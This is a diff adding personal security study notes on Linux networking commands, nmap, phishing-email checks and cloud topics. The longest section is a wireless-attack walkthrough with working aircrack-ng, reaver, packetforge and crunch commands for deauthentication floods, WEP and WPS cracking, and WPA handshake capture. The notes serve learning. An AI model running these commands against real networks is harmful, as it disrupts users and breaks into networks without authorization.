@@ -1,0 +1,1172 @@
+Network Files ->
+
+- /etc/nsswitch.conf // it is tell where to resolve ur hostname and other config files places
+- /etc/hosts  // info regarding hostname
+- /etc/sysconfig/network or /etc/hostname
+- /etc/sysconfig/network-scripts/ifcfg-nic 
+- /etc/resolv.conf
+
+
+ICMP ->
+- ICMP (type 11, code 0) denotes Time Exceeded
+- ICMP (type 13, code 3) denotes router is blocking ICMP
+- ICMP ping and ping sweeps are used to check for active systems and to check, if ICMP ping traverses a firewall
+- Test-NetConnection tool for troubleshooting at transport layer, default use ICMPs
+- Traceroute cmd uses UDP packets, on windows ICMP packets - https://drive.google.com/drive/u/1/my-drive ques 28
+- mtr (linux tool) and pathping (windows tool) for same tool as traceroute
+- Udemy Practice test _2 Question 48
+Traceroute works by increasing the "time-to-live" value of each successive batch of packets sent. The first three packets
+have a time-to-live (TTL) value of one (implying that they make a single hop). The next three packets have a TTL value of 2,
+and so on. When a packet passes through a host,normally the host decrements the TTL value by one,and forwards the packet to
+the next host. When a packet with a TTL of one reaches a host,the host discards the packet and sends an ICMP time exceeded
+(type 11) packet to the sender. The traceroute utility uses these returning packets to produce a list of hosts that the
+packets have traversed en route to the destination.
+
+- The Ping of Death first appeared in 1996 because applications misinterpreted oversized packets.
+
+- ip addr // for seeing IP related data
+
+- ifconfig              // to show ethernet settings and other internet config things, if 'eth0' is their in o/p then it means
+                        // their is wired connection , if u see 'wlan0' then it is wireless connected, additional ethernet
+                        // connections would be shown as 'eth1' and so on
+                        // 'lo' is a loop back interface which is a special interface which system uses to communicate with
+                        // itself, 'inet addr' is the local are LAN address or NAT address, 'RX packets' is the received packet
+                        // 'TX packet' is the transmitted packet
+- ifconfig eth1         // it will now show details for 'eth1' interface only
+- ifconfig eth0 up      // this will enable the internet connection
+- ifconfig eth0 down    // this will disable the internet connection
+
+- ipcalc ip_Address   // very usefull tool to understand Network segments such as Host, Network, Network Type, range etc
+
+- 'netstat' it is a cmd line tool that is used to display network connections, routing tables and network interfaces, it can
+be used to see network protocol statics
+- netstat -ie // gives same output as ifconfig
+- netstat -r  // to display routing table
+- netstat -c // display all continous listening services
+- netstat -a // display all current connections
+- netstat -at | less  // this will show only tcp connections
+- netstat -l | less   // this show the programs which r in listening state
+- netstat -lt | less   // this will show u listening tcp connection
+- netstat -lu | less   // this will show u listening udp connection
+- netstat -s | less   // this will show u the statictics such as the ip packets received and delivered
+- netstat -st | less  // to see statistics for the packets recived and delivered packets in tcp connection
+- netstat -su | less  // to see statistics for the packets recived and delivered packets in udp connection
+- netstat -p | less  // to see the pid of all connection which r available
+- netstat -n | less  // to see the numberic ports which r being used by different interfaces in ur system
+- netstat -an | grep  ':80'// now it will show the output for the connections with the grep entered pattern of text
+- netstat -ano // it will show that which port of ur computer is connected to the port of another computer in Local Address and
+Foreign Address and the if the connection is their between the local and Foreign address then the "state" would be "established"
+and also tell the process ids so we can check from their that what service connection is established their such as Dropbox or
+a hacker is using it. 
+
+- impt cmd -> netstat -rnv 
+
+- tcpdump -D // lists the interfaces which tcpdump is capable of Listening or capture from
+- tcpdump -i interface_name -nn // to capture traffic on particular interface, -nn will display the ports instead of protocol 
+  Ex -> http will be shown as 80 using -nn
+- tcpdump -w file_name.pcap '(src src_IP and dst dst_IP) or (src src_IP and dst dst_IP)' // to capture packets on desired hosts
+networks, -w is to write captured data to file with extension pcap
+- tcpdump -r file_name.pcap // to read file with captured packets
+- tcpdump host host_ip_address port 80 // use 'port' to define port
+- tcpdump -i eth0 -v src port 443 and dst dst_IP_address // here we r defining src port and and destination IP address
+- tcpdump -i eth0 tcp net 192.168.1.0/24  // to capture traffic on subnet and only show TCP data only
+
+Note -> use tcpdump to capture traffic and wireshark to analyse traffic
+
+
+
+ arp -a // it will list the table of IP addresses with their corresponding MAC addresses, The ARP is used to find the MAC 
+ address for Known IP addresses and the RARP(Reverse ARP) is to find IP addresses for known MAC addresses
+
+- ethtool nic_interface_name // provide info for the interface NIC
+
+- lo // the loopback device is a special interface that ur computer uses to communicate with itself, It is mainly used for diagnostics
+and troubleshooting, and to connect to servers running on the local machine
+
+# NIC Bonding -> NIC  bonding is also known as network bonding, It can be defined as the aggregation or combination of multiple NIC
+into a single bond interface, It's main purpose is to provide high availability and redundancy
+
+If u combine two NIC of 1 GB then it will provide 2GB and if one fails the other would be still working, Screenshot(529)
+
+NIC bonding Procedure ->
+- modprobe bonding -> it is to get the configuration of ur driver
+- modinfo bonding -> to get the info of ur bonding
+- Create the file -> /etc/sysconfig/network-scripts/ifcfg-bond0 then edit file -> /etc/sysconfig/network-scripts/ethernet1
+and file -> /etc/sysconfig/network-scripts/ethernet2
+then u point the 1st edit and 2nd edit ethernet files to ifcfg-bond0 
+then restart the network via cmd -> systemctrl restart network, Screenshot(530)
+To do above task -> https://academy.ehacking.net/courses/551622/lectures/10003630 in virtualbox
+
+wget // to download the files and apps in linux
+Ex -> wget http://website.com/file_to_download
+
+- Ping cmd will let u know if server is up but not that if the page on that server, hence to check that page we need the
+'curl' cmd
+	Ex -> curl http://website.com/filename // to check if page is up, in return it sends the page script
+		  curl -O http://website.com/filename  // if u wants to download a file, u can use this cmd in case the wget is
+												// not working
+												
+	File transfer cmds ->
+	
+	- ftp -> Ex -> Screenshot(533) 
+			To transfer the file to the server whoch is not running FTP daemon, we will try to load FTP on local host as
+			cmd -> ftp system_hostname // if daemon is not present it will say connection refused but still give ftp prompt 
+	- scp -> Ex - scp filename remote_host:path_to_copy 
+	- rsync // this is used by system admins to backup files to another system mostly using through cron job
+
+- System update and repos ->
+
+- apt-get is used for this task
+
+Note -> In some companies internet access is not allowed, In that case repos r setup locally on another server within
+the same network 
+
+- rmp (RedHat Package Manager) -> It is used when u already have package downloaded in ur system and u can install it
+locally using rpm while yum does all the things for u it downloads the package and installs aswell and then clean up the
+downloaded the package form the system
+cmd -> rpm -qa // q to query all the packages in system and list them 
+	   rpm -ihv path_to_package.rpm // on running this it will install package
+	   rpm -e package_name // to remove a package
+
+- Two types of upgrades in Linux ->
+	- Major Version upgrade from 5 to 6
+	- Minor Version upgrade from 7.1 to 7.2
+	
+	The difference in update and upgrade is that upgrade delete packages while update preserves the old packages
+	
+- To create Local repository form CD/DVD -> https://academy.ehacking.net/courses/551622/lectures/10003634
+
+------------------------------------------------------------------------------------------------------
+# Cybrary Insider Pro ->
+- nmap scanme.nmap.org
+
+- open zenmap ->
+	select "regular scan" on scanme.nmap.org
+	
+	sudo agt-get remove --auto-remove zenmap // cmd to remove zenmap
+	
+	nmap help -> Screenshot(487)
+	
+	nmap -V // to see version
+	nmap -h // better then nmap --help and man
+	
+	locate *.nse // list scripts
+	nmap --script-help whois-domain
+	nmap --script=script_name target_ip
+	Note -> first execute default script then execute the specific scripts
+	nmap -sC Target_ip // -sC runs default scripts
+	
+	Note - during a scan of an email server their is no need to scan default 1000 ports also so scan only 10 needed by
+	the email server to improve performance
+	
+	Nmap Scan Phases order -> Screenshot(488)
+	Phase 1(Script prescanning) -> Screenshot(489)
+	Phase 2(Target enumeration) -> Screenshot(490)
+	Phase 3(Host discovery) -> Screenshot(491)
+	Phase 4(Reverse-DNS resolution - Do this After determining which host to scan) -> Screenshot(492) 
+	Phase 5(Port Scanning) -> Screenshot(493)
+	Phase 6(Version Detection) -> Screenshot(494)
+    Phase 7(OS Detection) -> Screenshot(495)
+	Phase 8(Traceroute) -> Screenshot(496)
+	Phase 9(Script Scanning) -> Screenshot(497)
+	Phase 10(Output) -> Screenshot(498)
+	Phase 11(Script post-scanning) -> Screenshot(499)
+	
+	Syntax for nmap and nse -> Screenshot(500)
+	
+	Note -> It doesn't matter in what order u put switches and flags in nmap scan
+	
+	Target and output switches -> Screenshot(501) // cmd -> nmap ip_address -oN filename.txt
+	
+	U can also execute nmap scans for targets -> 192.168.0-255.1-254 but not preferred
+	other way -> nmap 192.168.185.128,130
+  
+  -----------------------------------------------------------------------------------------------------------------------
+  
+  Protocols -> From lecture 95 Vol 1(StationX) 
+
+Validate the Sender -> Copy the Body part of the email and paste it in any search engine, but be carefull do not click on
+the provided links, If it is a known attack if it is not brand new attack it will show the results accordingly otherwise
+not.	
+
+Use parsemail.org -> paste the whole email including body and headers in this site to check if the recieved email is
+ligitimate by checking IP address of mail, domains info provided and if the sender is company type or new company go to
+whois.domaintools site and check the whois lookup of sender
+
+- If privacy protection service is present in the whois lookup then it means owner is hidding it's identity and the legimate
+buissness will have non-private listings but if sender is single person then it could be legimate and still have private
+listings.
+EX-> bbc, blob.com
+
+For the private sender check the reverse domain available in tools section on whois.domaintools.com and then we can see what
+other domains r associated with this IP address, if their r too many domains associated with it then it is suspicious but
+still also lookup the other domains associated with the sender reverse lookup.
+
+Also check the website it self for it's legimate check as copy and paste the parts of the website on search engines if related
+data or links is seen that means the site is suspicious.
+
+Validate the attachments with the email using Virustotal which works on Digital Signature
+  
+To do scan from Virus total forward the scan to the virustotal as -> scan@virustotal.com
+
+List of suspected executables not to be present in emails or any msg ->Screenshot(482, 483)
+Extensions used to hide executables -> Screenshot(484)
+List of Safe extensions -> Screenshot(485)
+
+18002003344
+
+-----------------------------------------------------------------------------------------------------
+
+- To Connect the wireless adapter to kali virtual machine look here ->
+https://www.youtube.com/watch?v=zZG65GkWGdU&t=1s
+
+- MAC(Media Access Control) address is permanent, physical and unique address which is assigned to network interfaces by
+  manufacturer , IP address is used in the internet to identify computers and communicate between devices on the internet,
+  while the MAC address is used within the network to identify devices and transfer data between devices.
+  So each pack of data which is send within the network contains the source MAC and the destination MAC.
+
+- Changing MAC address provides us ->
+  - Anonymity
+  - Impersonate other devices
+  - Bypass filters
+  - or connect to network which only specific devices and specific MAC addresses r allowed to connect
+
+- use cmd -> ifconfig // to list interfaces on the current computer, interface here means a network card
+- The interfaces created in virtual machines r virtual interfaces bcz we set this machine to use NAT network
+  'lo' is the virtual interface created by linux, 'wlan0' is the external USB wireless adapter, 'ether' in the 'eth0' here
+represents the MAC address
+- For 'lo' and 'wlan0' u will notice u don't have an IP address and this is bcz none of these interfaces r connected to a
+ network
+- If u look into the right most corner of the kali and click a dropdown icon u will see that their is an option saying that
+ the 'Wifi Not Connected' and that's why the 'wlan0' currently does not have an IP address
+
+- ifconfig wlan0 down // to disable the interface
+- ifconfig wlan0 hw ether 00:11:22:33:44:55    // To change the MAC address to address -> 00:11:22:33:44:55 , just make sure ur address starts with 00:
+- ifconfig wlan0 up // to enable the interface
+
+- Whether u r watching a video or doing chat etc all the data is send in packets, In the network devices ensure that these packets go
+to right direction using the MAC address So each packet has a source MAC and destination MAC, Now if we want to send the packet to the
+router from the machine then we need to enter the MAC address of the Router
+- We can capture the data packets which r in the air even if they do not contain the destination MAC address, for this we need to change
+the mode of operation of our wireless interface so that it operates in Monitor mode
+
+cmd -> iwconfig   // to see wireless interfaces only and to check the monitor mode
+Here u will see the interface data for wlan0 only and the mode in it would be Managed this means that this is the default mode of all
+wireless devices and this device will only capture packets that has the destination MAC as the MAC address of this device
+cmd -> ifconfig wlan0 down // before changing the mode
+cmd -> airmon-ng check kill // to kill the process which could interfere when using the interface in monitor mode, this is not
+                            // mandatory cmd, this cmd will kill the network manager and u will lose the internet connection and this is
+                            // ok as we do not require the internet connection to run any of the attacks required in monitor mode
+
+cmd -> airmon-ng start wlan0 // this will start monitor mode on the interface wlan0
+
+- After enabling the monitor mode on our wireless interface we r able to capture all the wifi packets sent within our range even
+if the packet is not directed to our computer ,even if we r not connected to the target network and even without knowing the key
+or the password of the target network so we just only need a program that will capture these packets for us, prgm we r going to use
+is 'airodump-ng' it's part of the 'aircrack-ng' suit and it's a packet sniffer so it's basically a program designed to capture packets
+while u r in monitor mode
+So it will allow us to see all the wireless networks around us and show us detailed information about ->
+MAC address
+Channel
+Encryption
+Clients connected to this network etc
+cmd -> aireplay-ng -9 wlan0 // to check if injection is working 
+cmd -> airodump-ng wlan0 //start the monitor mode and discover wireless networks
+press ctrl+c // to quit
+
+Now in monitor mode ->
+- ESSID // it shows the name of the wireless networks
+- BSSID // it shows the MAC address
+- PWR // it shows the signal strength, higher the number better the signal their is
+- Beacons // these r frames sent by the network in order to broadcast its existence, So every network even if its hidden sent these
+          // types of frames, So it basically tells all the devices around it that I exist
+- #Data // this the no. of data packets
+- CH // this is the channel
+- MB // this is the maximum speed supported by the network
+- ENC // this is the encryption used by the network, if it is 'OPEN' then it means their is no password protection even on the network
+- CIPHER // it is the cipher used in the network
+- AUTH // this is the authentication used on the network
+
+Wifi band of a network defines what frequency it can use to broadcast the signal, this means it also define the frequency that the
+clients or the computer need to be able to support and use in order to be able to connect to this network, two main frequencies used
+in wifi networks r 2.4 and 5 ghz previously we were only sniffing on 2.4 ghz frequency and that's why u will notice that the wireless
+card of ur system shows more wireless networks discovered then ur wireless adapter
+In some places in world such as in ireland if the network is broadcasting over the 5ghz then the service provider will add 5g as the
+postfix in the name or 'ssid' of the wireless network
+
+cmd -> airodump-ng --band a wlan0 // this will switch and start sniffing on the 5 ghz frequency networks
+cmd -> airodump-ng --band abg wlan0 // this will sniff on both 2.4 and 5 ghz frequencies at the same time, the only problem is it
+                                    // is slow as the sniffing on two bands make the lot channels that has to hop on
+cmd -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0 // here we r telling to sniff and gather
+ // more data on particular network and writing that gathered data in a file and after firing the cmd it will show only one network
+ // and their will be a 2nd section also which will show u the clients connected to that network and their MAC addresses
+ // Here in 2nd section we can see the following parameters also such as
+ // - Rate // it is the speed
+ // - Lost // this is the amount of data lost
+ // - Frames // these the packets which we have captured
+ // - Probe // it shows the devices which r not connected but trying to connect with the network
+ // press ctrl + c // to quit
+
+ cmd -> ls // to list the files which contains the captured data of the network, u will see 4 files with the same name but different
+ // extensions with some post fix no. also added to it ex test-01.cap but our file name was only 'test'
+ // the file with extension 'cap' is the file that contains the data which we captured and it should contain the chat msgs, passwords
+ // etc anything which the connected devices to our target network did on the internet but all the data which is sent between the router
+ // and the connected devices is encrypted
+
+ cmd -> wireshark // to start the wireshark prgm which helps to analyse the data and then go to the File and open the file with the
+ // extension 'cap' and u will see that the data is encrypted except the device manufacture which was connected to the network so this
+ // way u kind of guess what computers r their and what OS they use
+
+ Deauthentication Attack -> This attack allow us to disconnect any device from any network before connecting to any of these networks,
+ and without the need to know the password for the network
+ To do this we r going to pretend to be the client that we want to disconnect by changing our MAC address to the MAC address of that
+ client and tell router that I want to disconnect from u and then we r going to be pretend the router again by changing our MAC address
+ to the router's MAC address and tell the client that u requested to be disconnected, So I'm going to disconnect u
+ This will allow us to successfully disconnect or deauthenticate any clint from any network, for this task be use a tool aireplay-ng
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no wlan0
+cmd in terminal 2 -> aireplay-ng --deauth 1000000000 -a router_MAC_address -c client_MAC_address wlan0
+// here we r going to keep sending large packets to both the router and the device, hence it will disconnect the device for very
+// long time and the only way is to quit from the aireplay-ng, this cmd will fail in the case the airodump-ng is running against
+// the target network
+// this is going to disconnect client form the network and only way to connect back is if u quit the running prgms from both terminals
+// this attack could be used in many ways just as in social engineering to ask client to install a backdoor or create another fake
+// access point and get them to connect to it and start spying on them from that access point
+
+Gaining Access ->
+WEP(Wired Equivalent Privacy) -> This is an old encryption but still used in some networks and it is easy to break, WEP uses algorithm
+RC4 to encrypt it's data,
+The way it works is that if a client wants to send something to the router then it will encrypt that data using a key then that data
+is sent in air then the access point or router will receive this encrypted packet and transform data back to it's unecrypted data\
+by using the same key and vice versa when router sends data to the client the problem is that in order to encrypt data while sending
+to the router WEP tries to generate a unique key for each packet to do this it generate 24bit initialization vector then the
+initialization vector is added with the password of the network and this generates a key stream and this key stream is used to encrypt
+the packet but at the time of sending the encrypted data it also append the initialization vector to the packet bcz once the router
+receives the packet it needs to be able to decrypt the packet and the router already has the network password so now it can generate
+the key stream to decrypt the data
+
+So the weakness in WEP ->
+- initialization vector size is too small
+- initialization vector is sent in plain text
+
+which means that the ->
+- initialization vector will repeat on busy networks
+- this makes the WEP vulnerable to statistical attacks
+- repeated initialization vector can be used to determine the key stream
+- and so the encryption got break
+
+Hence to crack WEP we need to ->
+- capture a large number of packets/initialization vector, we can use airodump-ng for this task
+- analyse the captured initialization vectors and crack the key, we can use aircrack-ng for this task
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0 // choose network of WEP
+// u will notice that under the #Data column the no. of usefull packets that contain a different initialization vector which we can
+// use in order to crack the key and higher the no. is more likely we will be able to crack the key and if the network is very buzy
+// the no. will increase very fast
+cmd in terminal 2 -> aircrack-ng file_name-01.cap // this will say in output as the key is found
+
+now quit the prgm in terminal 1 by ctrl + q
+now we can connect to the target network using the ASCII output in terminal 2 and u can also use the key which is found just remove
+the colons in the key, In some cases we will not see the ASCII password
+
+So now we r able to crack the WEP network and connect to it by using the key we found but still their is one problem which is that
+if the network is not buzy in that case the it would take time to capture enough initialization vector, So the solution to this problem
+is to force the AP to generate new packets with new initialization vectors.
+But before doing this we need to associate to this network, Associate here means we need to tell this network that we want to
+communicate with it bcz by defaults access points ignore any requests they get unless the device has connected to this network or
+associated with it and problem is we r still unable to connect to the network, what we r doing here is just telling the target network
+look i want to communicate with u don't ignore my requests so it is similar to when to click on the network when u wants to connect
+to it and u still haven't put the password u r just telling the target network that I want to communicate with u and don't ignore me
+
+So to Associate to the target network->
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0 // here #Data will increase
+// really very slow
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0// this is to associate
+// to the network, in the MAC address of the wireless adapter replace '-' with ':', after executing the cmd u will see in the terminal 1
+the wireless adapter MAC address to be appearing as the devices associated to the network
+
+So here we got associated to the network and if u send anything it's gonna accept it and it's going to communicate with u not u r still
+not connected to the network, u still cannot use the internet from the network
+
+Now we will start injecting packets into the traffic to force the access point to generate new packets with new initialization vectors,
+this will increase the number of data very quickly and allow us to crack WEP networks even if the network was not busy, Their r no. of
+ways to do this but one of the most reliable way is using the ARP Request Replay Attack
+
+ARP Request Replay Attack ->
+The idea behind this method is to wait for the ARP packet and once this packet is sent into network we r going to capture it and then
+retransmit it and once we do this the router is forced to generate a new packet with a new initialization vector, So by repeating this
+process we will be forcing the router to continously generate new packets with new initialization vectors then once we have enough of
+the initialization vectors we can run aircrack-ng just like before and crack the key
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 -> aireplay-ng --arpreplay -b target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 // this will
+// execute the ARP Request Replay Attack, the #Data in terminal 1 will increase very quickly which means we manage to capture the
+// ARP packet and ARP Request Replay Attack is running as aspected
+cmd in terminal 2 again ->aircrack-ng file_name-01.cap // this will say in output as the key is found, their could be the case that
+// it require more data packets and the reason for this is that u modified the settings of the network so that it use a 128 bit key
+// bcz in WEP u can either use 64bit or 128 bit key
+
+Korek Chopchop Attack -> Another method of increasing the data rapidly in network that has no clients associated with it or it has very
+low traffic Korek Chopchop Attack, this attack sometimes might work and sometimes not
+In this method instead of directly injecting the ARP packet that we capture we r gonna try to determine the history for this packet,
+once we do do that we gonna create a new packet, So we gonna forge a new packet and inject this new packet into the traffic and this
+will force the access point to create a new packet with a new initialization vector, we gonna capture it and inject it back into the
+traffic we gonna keep doing this untill the no. of data is high enough to crack through a key
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 -> aireplay-ng --chopchop -b target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 // this will execute
+// the chop chop attack, while execution it is going to ask u that if u want to decrypt and determine it's keystream for which enter
+// 'y' for yes, the keystream would we got saved into a file after execution is completed and it's name would be shown to u at the
+// end of the execution
+cmd in terminal 3 again -> packetforge-ng -0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter -k 255.255.255.255
+                          -l 255.255.255.255 -y keystreamfile_obtained_by_chopchop_attack -w name_of_the_forged_packet
+//-k 255.255.255.255 represents the destination IP and -l 255.255.255.255 is the source
+
+Next step is to inject this forged packet into the traffic and cause the no. of data to increase rapidly
+
+cmd in terminal 2 again -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 again -> aireplay-ng -2 -r name_of_the_forged_packet wlan0 // here -2 is for replay and this will inject the packet
+// it will ask u while execution if u want to use this packet so enter 'y' for yes
+// here the higher the percentage of keystream u obtained during the first time execution of the cmd in the terminal 3 the more chances
+// their will be of ur success and if ur #Data in terminal 1 is increasing quickly then it means the attack was successfull
+cmd in terminal 2 again ->aircrack-ng file_name-01.cap //this will say in output as the key is found
+
+Fragmentation Attack -> In this attack we have to obtain 1500 bytes of the PRGA(pseudo random generation algorithm), we need to be
+closer to the target network to successfully run this attack but it's much quicker then the chop chop attack, after obtaining the
+PRGA we can use it to forge a new packet which can be injected into the traffic to generate new initialization vector
+So concept is simple we gonna capture a packet determines it's PRGA, forge a new packet and then inject that packet into the air
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 -> aireplay-ng --fragment -b target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 // this will execute
+// the fragmentation attack, after getting the packet while execution it is going to ask if u want to use it then type 'y' after which
+// it will try to determine the PRGA, if in the case that packet wasn't usefull it will ask it will wait for another packet to use
+// and ask u again if u want to use this packet then type 'y' do this untill the keystream is generated and the file name for the
+// keystream appears at the end of the execution
+cmd in terminal 3 again -> packetforge-ng -0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter -k 255.255.255.255
+                          -l 255.255.255.255 -y keystreamfile_obtained_by_chopchop_attack -w name_of_the_forged_packet
+cmd in terminal 2 again -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 again -> aireplay-ng -2 -r name_of_the_forged_packet wlan0 // here -2 is for replay and this will inject the packet
+// it will ask u while execution if u want to use this packet so enter 'y' for yes
+cmd in terminal 2 again ->aircrack-ng file_name-01.cap //this will say in output as the key is found
+
+WPA/WPA2 Cracking ->
+Both of them WPA and WPA2 r very similar, both can be cracked using the same methods, the only difference is that the encryption
+used to ensure the msg integrity as WPA uses the TKIP and WPA2 uses the CCNP
+WPA and WPA2 both come after WEP and they were designed to address weaknessess in WEP hence they r more secure
+
+This WPS feature, if enabled and misconfigured can be exploited to recover the key without cracking the actual encryption
+
+WPS allows devices to connect to network easily without having to enter the key for the network, So it was actually designed to simplify
+the process of connecting printers and such devices, U can actually see the WPS button on most wireless enabled printers
+- IF this button on printer or device is presses and then press the WPS button on router, u will notice the printer will get connect
+to the router without u having to enter the key, this way the authentication is done using an eight digit pin which could be considered
+as a password which is made of only numbers and the length of this password is only 8.
+
+So this actually gives us a releatively small list of possible passwords and we can try all these passwords in a relatively short time
+
+Once we get this pin it can be used to recover actuall WPA or WPA2 key. So we r here exploiting a feature that can be enabled on these
+encryptions, So this to work 1st we need WPS to be enabled on the network and also it needs to be misconfigured, So it needs to be
+configured as the normal pin authentication and not a push button authentication.
+If the push button authentication is used then the router will refuse any pins that we try unless the WPS button is pressed on the
+router. So in most modern routers the WPS will be disabled by default, but still it is always a gud idea to check if the WPS is
+enabled and try it.
+
+Exploiting the WPS ->
+- enable the monitor mode on the wireless adapter
+cmd -> wash --interface wlan0 // this will show all the networks which have WPS enabled,
+  - Vendors - it will also list the vendors of the hardwares
+  - LCK - tell us whether WPS is locked or not, bcz sometimes WPS locks after no. of failed attempts, hence if it says 'No' then we
+          can go ahead and try to guess the pin
+  - WPS - it tells the version of WPS
+  - dBm - tells the signal strength
+  - Ch - Channel
+
+cmds down below terminal 2 should fire just after the terminal 1
+cmd in terminal 1 -> reaver --bssid target_network_bssid --channel channel_no --interface wlan0 -vvv --no-associate
+// this will use bruteforce to get the right pin, -vvv tells more details if things go wrong
+// if u r getting a bug which means u need to use the older version, download from here -> https://files.fm/f/eqrts3rc
+//    then -> chmod +x reaver // to change the permissions of file
+//    cmd -> ./reaver
+//then ->./reaver --bssid target_network_bssid --channel channel_no --interface wlan0 -vvv --no-associate // run from the directory
+// after the execution is done at it's end u will find 'WPS Pin' which will show the o/p pin in the 'WPA PSK' u will get the WPA key
+// which u can use to connect to network
+cmd in terminal 2 -> aireplay-ng --fakeauth 30 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+// here we r mentioning 30 so that we can associate with the target network every 30 seconds
+
+On WPA2 the keys r unique they r temporary they r much longer then WEP, theirfore the packet sent in air contain no information that
+is usefull for us, So even if we capture 1 million packets we can't use them to crack the key, the only packets that contain the usefull
+information r the handshake packets, these r 4 packets transfered between a client and router when the client connects to the network
+
+Capture Handshake packets ->
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+// we have to wait know as the handshake is sent when the client connects to the network so we have to sit down and wait untill a new
+// client connect to the network and we will get a msg that the handshake is captured, alternatively we can use a deauthentication
+// attack so we can disconnect a client from a network and then the clint will automatically connect once we stop the attack, and while
+// connecting the handshake will be sent in air and we will capture it
+cmd in terminal 2 -> aireplay-ng --deauth 4 -a router_MAC_address -c client_MAC_address wlan0 // here we r writing or sending only 4
+// packets so that the victims cannot be able to feel that they r even being disconnected
+// On terminal 1 on right top corner we will receive the 'WPA handshake' as an output when terminal 2 cmd execution is done
+
+Handshake does not contain the information that can help us to recover or recalculate the WPA key, the information in it can only be
+used to check whether the password is valid or not, So we r going to create a wordlist which is a big text file that contains a large
+no. of passwords, then go through this file go through the passwords one by one and use them with the handshake in order to check that
+whether this password is valid or not
+
+Creating a Wordlist ->
+Cruch tool can be used to create wordlist
+Syntax -> crunch min_charters_for_passwrd max_charters_for_passwrd characters_to_be_used -t pattern -o file_name
+//-t is usefull when u know some of the characters of the password
+Ex -> crunch 6 8 123abc$ -t a@@@@b -o wordlist
+cmd -> man crunch // for the manual
+
+Now to crack the password aircrack-ng is going to unpack the handshake and extract the usefull information, the MIC or Message integrity
+code is used by the accessed point to verify whether a password is correct or not, So it's going to seperate MIC and then use the other
+information combined the first password from the wordlist to generate an MIC which is another MIC and then compare the generated MIC
+to the MIC already in the Handshake, If the MIC using the available information and the password from the wordlist is the same then the
+password used to generate MIC is the password for the network and this will go on through all the passwords in the wordlist and that's
+why the success of the attack really depend on ur wordlist
+
+cmd -> aircrack-ng file_name.cap -w wordlist.txt // here the program will check for the password from the wordlist file and if ur
+// password is in the wordlist it will give the output as the key found
+
+Cracking the key quicker using the rainbow table ->
+In the previous method the aircrack-ng went through the wordlist file, it combined each password in the wordlist with the essid to
+create the PMK using the pbkdf2 algorithm and then compare the PMK to the Handshake, but his takes the most time of the cracking process
+But in many scenerios we will have access points that doesn't have any clients connected to it like in the previous method, hence we
+need to wait untill the client connects and this this case we can save time by converting our wordlist to a PMK list as converting the
+password to a PMK takes the most time and once we capture the handshake we use our ready PMK's to crack the key.
+
+we can do this using airolib-ng
+cmd -> airolib-ng  test-db --import passwd wordlist_file // this will create a database and import our wordlist into the database
+cmd -> echo "target_essid_name" > test-essid
+cmd -> airolib-ng test-db --import essid test-essid // now we r importing essid
+cmd -> airolib-ng test-db --batch // here we compare each password and combine with the essid and create PMK from each password in list
+// after the batch process when all the passwords r converted to PMK's they will be stored in the Database here it is test-db
+cmd -> aircrack-ng -r test-db handshake_file_name.cap // this will list the key as the output
+
+We can speed up the cracking process using a tool called hashcat which uses the GPU instead of CPU for the cracking process
+It's easier to find the grahic card in Windows then linux hence we r going to use Windows for this task
+Download files from following links->
+https://hashcat.net/hashcat/ - this is the one which do the cracking
+after this we need to convert the handshake file to hccap file so the handshake was captured in a cap file, we have to convert it to
+hccap file so that a hashcat can read this file
+
+Tor Website EHAcademy ->
+
+- https://academy.ehacking.net/courses/525401/lectures/9583518 // Darknet Infomation and News post media
+
+- Hosting website on the dedicated server or on the rented server doesn't actually affects anyway in terms anonymity on
+darknet
+
+- Reliable VPS providers for hidden websites hosting -> https://academy.ehacking.net/courses/525401/lectures/9583506
+
+- Creating a VPS using digital ocean https://academy.ehacking.net/courses/525401/lectures/9583507
+									 https://academy.ehacking.net/courses/525401/lectures/9583508
+									 https://academy.ehacking.net/courses/525401/lectures/9583509
+   To host website using nginx		 https://academy.ehacking.net/courses/525401/lectures/9583510
+									 https://academy.ehacking.net/courses/525401/lectures/9583511
+									 https://academy.ehacking.net/courses/525401/lectures/9583512
+                   
+                   
+                   
+   -------------------------------------------------------------------------------------------------------------------
+   
+   
+   
+
+
+
+
+# Information Gathering ->
+ 
+
+recon-ng tool -> 
+cmd -> recon-ng 
+	> keys list // do later 
+
+
+ctrl + page_up and ctrl + page_down to switch among the kali terminals in multiple tabs
+
+
+---------------------------------------------------------------------------------------------------------------------------
+
+CCSP ->
+NIST's Cloud 5 Actors and Functions -> Screenshot(432, 433)
+
+Security Risks -> Screenshot(434)
+
+Cloud Deployement Models -> Screenshot(435)
+Public Cloud -> Screenshot(436,437)
+Private Cloud -> Screenshot(438, 439)
+Hybrid Cloud -> Screenshot(440,441)
+Community Cloud -> Screenshot(442, 443)
+
+Cloud Service Models -> Screenshot(444)
+SaaS -> Screenshot(445, 446)
+Security for SaaS -> Screenshot(447)
+
